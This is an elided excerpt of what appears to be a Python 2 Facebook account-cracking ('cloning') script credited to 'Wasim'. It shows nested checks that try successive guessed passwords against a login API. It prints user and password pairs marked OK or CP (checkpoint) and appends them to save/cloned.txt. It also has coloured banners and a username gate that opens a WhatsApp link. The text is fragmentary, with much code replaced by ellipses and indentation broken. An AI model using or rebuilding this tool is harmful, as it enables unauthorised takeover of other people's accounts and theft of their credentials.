...
\033[1;94mFACEBOOK  A-Wasim-Malik
                  
\033[1;92mFB PAGE   Top Info 0.7
...
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
	    ...
	    time.sleep(2)
            ...
            os.system('xdg-https://wa.me/+923023775733')
    else:
...
def Zeek():
    ...
    time.sleep(0.10)
    print '\x1b[1;96m ════Beast'
    time.sleep(0.10)
    print '\x1b[1;97m════Wasii'
    time.sleep(0.10)
                ...
                if 'www.facebook.com' in q['error_msg']:
                    ...
                    if 'access_token' in q:
                        ...
                        if 'www.facebook.com' in q['error_msg']:
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;32m[Wasim-OK]  ' + k + c + user + '  |  ' + pass3
                                okb = open('save/cloned.txt', 'a')
                                ...
                                if 'www.facebook.com' in q['error_msg']:
                                    print '\033[1;97m[Wasim-CP] ' + k + c + user + '  |  ' + pass3 
                                    cps = open('save/cloned.txt', 'a')
                                    ...
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;32m[Wasim-OK]  ' + k + c + user + '  |  ' + pass4 
                                        okb = open('save/cloned.txt', 'a')
                                        ...
                                        if 'www.facebook.com' in q['error_msg']:
                                            print '\033[1;97m[Wasim-CP] ' + k + c + user + '  |  ' + pass4
                                            cps = open('save/cloned.txt', 'a')
                                            ...
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\x1b[1;32m[Wasim-OK]  ' + k + c + user + '  |  ' + pass5
                                                okb = open('save/cloned.txt', 'a')
                                                ...
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print '\033[1;97m[Wasim-CP] ' + k + c + user + '  |  ' + pass5 
                                                    cps = open('save/cloned.txt', 'a')
...
\033[1;95mFb\033[1;97mMr-Wasiii"""
